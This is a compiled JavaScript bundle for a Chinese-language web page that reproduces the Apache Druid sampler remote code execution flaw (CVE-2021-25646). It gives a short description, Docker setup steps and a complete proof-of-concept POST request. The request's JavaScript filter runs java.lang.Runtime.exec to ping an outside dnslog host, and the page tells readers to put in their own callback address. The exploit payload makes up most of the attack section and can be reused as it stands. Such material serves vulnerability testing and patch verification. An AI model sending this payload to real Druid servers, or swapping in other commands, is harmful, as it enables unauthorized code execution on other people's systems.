(window.webpackJsonp=window.webpackJsonp||[]).push([[346],{1897:function(t,s,a){t.exports=a.p+"assets/img/2ff63956-f284-448b-aa1f-ad388b2c1be2.29ffabdc.png"},1898:function(t,s,a){t.exports=a.p+"assets/img/76ab3573-05f8-4abe-b4ea-cd4d400689ee.5cc3cf34.png"},2395:function(t,s,a){"use strict";a.r(s);var n=a(75),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,n=t._self._c||s;return n("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[n("h1",{attrs:{id:"apache-druid-sampler-远程代码执行漏洞-cve-2021-25646"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#apache-druid-sampler-远程代码执行漏洞-cve-2021-25646"}},[t._v("#")]),t._v(" Apache Druid sampler 远程代码执行漏洞 CVE-2021-25646")]),t._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),n("p",[t._v("Apache Druid 是用Java编写的面向列的开源分布式数据存储，旨在快速获取大量事件数据，并在数据之上提供低延迟查询。\nApache Druid 默认情况下缺乏授权认证，攻击者可以发送特制请求，利用Druid服务器上进程的特权执行任意代码。\nApache Druid包括执行用户提供的JavaScript的功能嵌入在各种类型请求中的代码。此功能在用于高信任度环境中，默认已被禁用。但是，在Druid 0.20.0及更低版本中，经过身份验证的用户发送恶意请求，利用Apache Druid漏洞可以执行任意代码")]),t._v(" "),n("h2",{attrs:{id:"漏洞影响"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("Apache Druid < 0.20.1")]),n("br"),t._v(" "),n("h2",{attrs:{id:"环境搭建"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[t._v("#")]),t._v(" 环境搭建")]),t._v(" "),n("p",[t._v("这里使用Docker来搭建环境")]),t._v(" "),n("a-alert",{attrs:{type:"success",message:"Docker下载链接: https://github.com/apache/druid/archive/druid-0.20.0.zip",description:"",showIcon:""}}),t._v(" "),n("br"),t._v(" "),n("p",[t._v("下载之后进入目录 "),n("code",[t._v("distribution\\docker")])]),t._v(" "),n("p",[t._v("执行命令编译 "),n("code",[t._v("docker-compose up -d")])]),t._v(" "),n("p",[n("img",{attrs:{src:a(1897),alt:"2ff63956-f284-448b-aa1f-ad388b2c1be2"}})]),t._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),n("p",[t._v("验证POC")]),t._v(" "),n("div",{staticClass:"language-shell line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-shell"}},[n("code",[t._v("POST /druid/indexer/v1/sampler\nContent-Type: application/json\n\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"type"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"index"')]),t._v(", "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"spec"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"ioConfig"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"type"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"index"')]),t._v(", "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"inputSource"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"type"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"inline"')]),t._v(", "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"data"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"{'),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("isRobot"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":true,"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("channel"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("#x"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(","),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("timestamp"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("2021-2-1T14:12:24.050Z"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(","),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("flags"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("x"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(","),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("isUnpatrolled"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":false,"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("page"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("1"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(","),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("diffUrl"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("https://xxx.com"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(","),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("added"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":1,"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("comment"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("Botskapande Indonesien omdirigering"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(","),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("commentLength"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":35,"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("isNew"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":true,"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("isMinor"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":false,"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("delta"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":31,"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("isAnonymous"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":true,"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("user"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("Lsjbot"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(","),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("deltaBucket"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":0,"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("deleted"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":0,"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("namespace"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v(":"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v("Main"),n("span",{pre:!0,attrs:{class:"token entity",title:'\\"'}},[t._v('\\"')]),t._v('}"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(", "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"inputFormat"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"type"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"json"')]),t._v(", "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"keepNullColumns"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" true"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(", "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"dataSchema"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"dataSource"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"sample"')]),t._v(", "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"timestampSpec"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"column"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"timestamp"')]),t._v(", "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"format"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"iso"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(", "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"dimensionsSpec"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(", "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"transformSpec"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"transforms"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(", "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"filter"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"type"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"javascript"')]),t._v(", "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"dimension"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"added"')]),t._v(", "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"function"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("\"function(value) {java.lang.Runtime.getRuntime().exec('ping p3fpw5.dnslog.cn')}\"")]),t._v(", "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('""')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"enabled"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" true"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(", "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"type"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"index"')]),t._v(", "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"tuningConfig"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"type"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"index"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v(", "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"samplerConfig"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"numRows"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("500")]),t._v(", "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"timeoutMs"')]),n("span",{pre:!0,attrs:{class:"token builtin class-name"}},[t._v(":")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("15000")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br")])]),n("p",[n("img",{attrs:{src:a(1898),alt:"76ab3573-05f8-4abe-b4ea-cd4d400689ee"}})]),t._v(" "),n("br"),t._v(" "),n("a-alert",{attrs:{type:"success",message:"注意请求中这个位置改为你的dnslog平台地址",description:"",showIcon:""}}),t._v(" "),n("br"),t._v(" "),n("a-alert",{attrs:{type:"success",message:"java.lang.Runtime.getRuntime().exec('ping -c 4 xxxxx.dnslog.cn')",description:"",showIcon:""}}),t._v(" "),n("br")],1)}),[],!1,null,null,null);s.default=e.exports}}]);